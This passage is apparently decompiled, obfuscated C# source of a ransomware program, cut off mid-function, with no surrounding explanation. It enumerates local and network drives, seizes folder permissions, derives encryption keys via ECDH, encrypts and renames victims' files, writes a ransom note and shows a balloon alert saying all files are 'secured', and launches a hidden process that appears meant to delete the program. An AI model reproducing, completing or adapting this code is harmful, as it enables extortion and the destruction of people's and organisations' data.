	public static void quaIrXBWxfUit(string IwcYvEJltJkiA = "SW5mb3JtYXRpb24uLi4=", string MrEKCqJZLJSr = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(XtEtTgUvwHGMW(IwcYvEJltJkiA));
		val.set_BalloonTipText(XtEtTgUvwHGMW(MrEKCqJZLJSr));
		val.ShowBalloonTip(30000);
	}

	public static void fNSTzMmNmz(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107387809)), getString_0(107387824) + text + getString_0(107387783) + string_0);
	}

	public static void DxkPRjlZwqzF(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = XtEtTgUvwHGMW(getString_0(107387778));
		processStartInfo.Arguments = getString_0(107387237) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool lSSmXkoNzcQSWj(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool itNqjNjKYVjjpBU(string string_0)
	{
		try
		{
			mBFjfBvsSut CS_0024_003C_003E8__locals0 = new mBFjfBvsSut();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.NvCcfrWLFEi = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.NvCcfrWLFEi);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107387232);
		}
		catch
		{
			return false;
		}
	}

	public static void oQVgdpANcfhNxO(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] array = null;
			array = (CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(XtEtTgUvwHGMW(getString_0(107387198))) : Encoding.ASCII.GetBytes(XtEtTgUvwHGMW(getString_0(107387255))));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string APenBLIadmvU(string EWbJaoeQmVXeb, int EFPQtWwKUJFyrq = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(EFPQtWwKUJFyrq);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(EWbJaoeQmVXeb, 1, intPtr, ref EFPQtWwKUJFyrq) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string FLLRBMBfzt(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static byte[] jjPIQkyhDHD(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	public static void jbPwnYxxejKK()
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Create(CngAlgorithm.ECDiffieHellmanP521, null, new CngKeyCreationParameters
		{
			ExportPolicy = CngExportPolicies.AllowPlaintextExport
		}));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		VfmZCqDrTnYlT = eCDiffieHellmanCng.Key.Export(CngKeyBlobFormat.EccPrivateBlob);
		FfXSrTItXwhd = eCDiffieHellmanCng.PublicKey.ToByteArray();
	}

	public static byte[] KGczbSpbMzb(byte[] byte_0, byte[] byte_1)
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Import(byte_0, CngKeyBlobFormat.EccPrivateBlob));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		return eCDiffieHellmanCng.DeriveKeyMaterial(CngKey.Import(byte_1, CngKeyBlobFormat.EccPublicBlob));
	}

	public static void KlGYVRewNV()
	{
		spDXxUcNpZnQ(getString_0(107396573), XtEtTgUvwHGMW(getString_0(107387173)));
		string text = XtEtTgUvwHGMW(getString_0(107387491));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387654) + text + getString_0(107387654) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396573);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void BHcaTUPjYtf(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387426) + string_0 + getString_0(107387449) + ex.Message + getString_0(107395810));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string KDRBaizPAVVdHDL()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389086);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107387328);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107387383))) ? getString_0(107387333) : getString_0(107387374));
				break;
			case 0:
				text = getString_0(107387356);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107387323);
				break;
			case 4:
				text = getString_0(107387342);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388600) : getString_0(107387301));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107387273) : getString_0(107387310)) : getString_0(107387315)) : getString_0(107387292));
				break;
			case 10:
				text = getString_0(107387268);
				break;
			}
		}
		if (text != getString_0(107389086))
		{
			text = getString_0(107387263) + text;
			if (oSVersion.ServicePack != getString_0(107389086))
			{
				text = text + getString_0(107387783) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string qyGtvptaEJy(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395465);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107394920)));
				streamWriter.WriteLine(getString_0(107395810));
				streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107389654)));
				streamWriter.WriteLine(string_0);
				if (eSjMTjCatON)
				{
					streamWriter.WriteLine(getString_0(107395810));
					streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107390072)));
					streamWriter.WriteLine(ySVDzMAbizHUS.yinVnqLUaFwpJQJ());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !MFCrMNyVwftIF)
				{
					File.AppendAllText(text, getString_0(107390039) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387282) + ex.Message + getString_0(107395810));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void XNBzvxsMHCm(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		NoEnPzbDkfhvS.kTXTIWfGzHEwJ CS_0024_003C_003E8__locals0 = new NoEnPzbDkfhvS();
		CS_0024_003C_003E8__locals0.mJAooCuEQeBfV = string_1;
		CS_0024_003C_003E8__locals0.tcuSYIIomKFQ = string_2;
		CS_0024_003C_003E8__locals0.weaWcqsUGynTpn = string_3;
		CS_0024_003C_003E8__locals0.WHtCQmtmCerFiI = string_4;
		if (DHzgvUPuaGcJ && !KDRBaizPAVVdHDL().Contains(getString_0(107388600)) && !KDRBaizPAVVdHDL().Contains(getString_0(107386713)))
		{
			PiMttoSkAGL.wRfMmbFSROa();
		}
		cjnjoiIOwY = Convert.FromBase64String(CS_0024_003C_003E8__locals0.weaWcqsUGynTpn);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396092))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = APenBLIadmvU(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !qyAhWYLrtiOtS.Contains(text))
							{
								qyAhWYLrtiOtS.Add(text);
							}
							else if (!qyAhWYLrtiOtS.Contains(array[i].Name))
							{
								qyAhWYLrtiOtS.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!qyAhWYLrtiOtS.Contains(array[i].Name))
							{
								qyAhWYLrtiOtS.Add(array[i].Name);
							}
						}
					}
					else if (!qyAhWYLrtiOtS.Contains(array[i].Name))
					{
						qyAhWYLrtiOtS.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!qyAhWYLrtiOtS.Contains(string_0[i]))
				{
					qyAhWYLrtiOtS.Add(string_0[i]);
				}
			}
		}
		if (qyAhWYLrtiOtS.Contains(XtEtTgUvwHGMW(getString_0(107386700))) && OCCDMTBKtUqAz == getString_0(107396859))
		{
			qyAhWYLrtiOtS.Remove(XtEtTgUvwHGMW(getString_0(107386700)));
		}
		Parallel.ForEach(qyAhWYLrtiOtS, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NoEnPzbDkfhvS.kTXTIWfGzHEwJ();
			CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm = string_0;
			if (WRwAKzNShnoL && !KDRBaizPAVVdHDL().Contains(NoEnPzbDkfhvS.getString_0(107388610)) && !KDRBaizPAVVdHDL().Contains(NoEnPzbDkfhvS.getString_0(107386723)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						lSSmXkoNzcQSWj(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (mWfsjXfVaDjgsa == NoEnPzbDkfhvS.getString_0(107396869))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JVXFxJQrKlaBZ(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.weaWcqsUGynTpn);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JVXFxJQrKlaBZ(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.weaWcqsUGynTpn);
			}
		});
	}

	public static void JVXFxJQrKlaBZ(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389086));
		List<string> list3 = list2;
		if (LMpNgFGShlT == getString_0(107396682))
		{
			if (DMbGhzJPCMTj == getString_0(107396859) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && itNqjNjKYVjjpBU(string_0))
			{
				gGChXitTqmNqQg gGChXitTqmNqQg = null;
				try
				{
					gGChXitTqmNqQg = new gGChXitTqmNqQg(string_0.Replace(getString_0(107396781), getString_0(107389086)));
				}
				catch
				{
					list = ddQKitSedfEpH(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					HFQDcpWJIQ(gGChXitTqmNqQg.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = ddQKitSedfEpH(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = ddQKitSedfEpH(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = YhjuApFlyy.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0495;
					}
				}
				if ((HVmQpJlElf == getString_0(107396682) && !item.EndsWith(text)) || lBBLtRfPsPV.Contains(item))
				{
					continue;
				}
				if (mdbUrlsnzSwt == getString_0(107396859))
				{
					try
					{
						if (dHuTNVWgMqhChXsi.uwHkPSlbEdqzd(item))
						{
							dHuTNVWgMqhChXsi.YaBImKBJBjtLtc(item);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(item);
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(item)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZTtOBFIFhDPJ == getString_0(107396859) && fileStream.Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 && !list3.Contains(text))
					{
						if (CMdYdSoRLCrMajhb == getString_0(107396859))
						{
							foreach (string item2 in hHDzREQRrQkqjKe)
							{
								if (item.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == getString_0(107396859))
								{
									if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == getString_0(107396682))
								{
									try
									{
										ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389199), getString_0(107389162), getString_0(107389149), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = zuVeojPvzZvsAuYXeg.eiVZeDjgvjzXx(item, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
						byte[] rJbBOzKoWoPeh = zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						zuVeojPvzZvsAuYXeg.efnMlvSzfC(item, rJbBOzKoWoPeh);
						if (string_2 != getString_0(107386659))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386659))
					{
						LHPrCtCcCAgjDkmw(item, item + string_2, cjnjoiIOwY);
					}
					else
					{
						LHPrCtCcCAgjDkmw(item, item + getString_0(107386654), cjnjoiIOwY);
					}
				}
				catch (Exception)
				{
				}
				IL_0495:;
			}
		}
	}

	public static void HFQDcpWJIQ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		HbGtZiKmUw.HLVtOJtcIkZeWP CS_0024_003C_003E8__locals0 = new HbGtZiKmUw();
		CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa = list_0;
		CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = string_1;
		CS_0024_003C_003E8__locals0.JzXWXIIovwkoW = string_2;
		CS_0024_003C_003E8__locals0.kEFVKbULbQeU = string_3;
		CS_0024_003C_003E8__locals0.JQuaujjSravKN = new List<string> { getString_0(107389086) };
		if (HVmQpJlElf == getString_0(107396682))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					HbGtZiKmUw.QScawntZyyJuoh CS_0024_003C_003E8__locals1 = new HbGtZiKmUw.QScawntZyyJuoh();
					CS_0024_003C_003E8__locals1.tkdfLXnvtaLVtT = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.ksJAkzHcZyIN = enumerator2.Current;
					if (((!CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388962)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388937)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388904)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388855)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388874)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388817)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388284)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388271)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388290)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388253)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388212)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388227)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388201)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388148))) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107388123)))) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388082)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388097)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388048)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388063)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388526)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388541)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388524)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388475)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388462)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388441)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388460)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388447)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388398)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388413)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107388396))) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388339)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388358)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107396381)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388313)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107388320)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387771)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387766)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387761)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107387788)) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(rwyuADDQdblNA) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(LImNkSPhwOOQHW) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(mqQgvSYgrlnpSvAge))
					{
						if (CS_0024_003C_003E8__locals0.JzXWXIIovwkoW.Length != 0)
						{
							string[] jzXWXIIovwkoW2 = CS_0024_003C_003E8__locals0.JzXWXIIovwkoW;
							int num2 = 0;
							while (num2 < jzXWXIIovwkoW2.Length)
							{
								string value2 = jzXWXIIovwkoW2[num2];
								if (!CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_10d8;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD))
							{
								goto IL_10d8;
							}
						}
						catch (Exception)
						{
							goto IL_10d8;
						}
						if (CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(string_0) && !lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN))
						{
							if (mdbUrlsnzSwt == HbGtZiKmUw.getString_0(107396877))
							{
								try
								{
									if (dHuTNVWgMqhChXsi.uwHkPSlbEdqzd(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN))
									{
										dHuTNVWgMqhChXsi.YaBImKBJBjtLtc(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
									}
								}
								catch
								{
								}
							}
							lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (qqVKUcwYqRObMU)
									{
										Console.WriteLine(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412348) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412757) + new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length + HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412768));
										Console.WriteLine(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412355), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
										Console.WriteLine(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412298), UNPGQjVMpE.Elapsed);
										Console.WriteLine(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107412727));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN)))
							{
								rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN));
							}
							BHcaTUPjYtf(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							try
							{
								new dfEMPHnLgeI().KIkInStTZGC(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (qqVKUcwYqRObMU)
										{
											Console.WriteLine(HbGtZiKmUw.getString_0(107412831) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412754) + new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length + HbGtZiKmUw.getString_0(107412765));
											Console.WriteLine(HbGtZiKmUw.getString_0(107412724));
										}
									}
									catch
									{
									}
									spDXxUcNpZnQ(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107412651)), HbGtZiKmUw.getString_0(107387672) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107387672) + XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107413106)) + HbGtZiKmUw.getString_0(107387672) + Environment.UserName + HbGtZiKmUw.getString_0(107387672) + XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107413121)));
								}
							}
							catch (Exception ex14)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107413096) + ex14.Message + HbGtZiKmUw.getString_0(107395828));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length != 0L)
									{
										goto end_IL_08d2;
									}
									goto end_IL_08d1;
									end_IL_08d2:;
								}
								catch (Exception ex14)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412983) + ex14.Message + HbGtZiKmUw.getString_0(107395828));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									goto end_IL_08d1;
								}
								byte[] bytes2;
								if (!(ZTtOBFIFhDPJ == HbGtZiKmUw.getString_0(107396877)) || new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length <= Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 || CS_0024_003C_003E8__locals0.JQuaujjSravKN.Contains(string_0))
								{
									if (eSjMTjCatON)
									{
										CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
									}
									bytes2 = Encoding.ASCII.GetBytes(jdzEbvPutazU);
									if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
									{
										if (!wRVzxmISkhBzKR)
										{
											if (!MFCrMNyVwftIF)
											{
												edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY);
											}
											else
											{
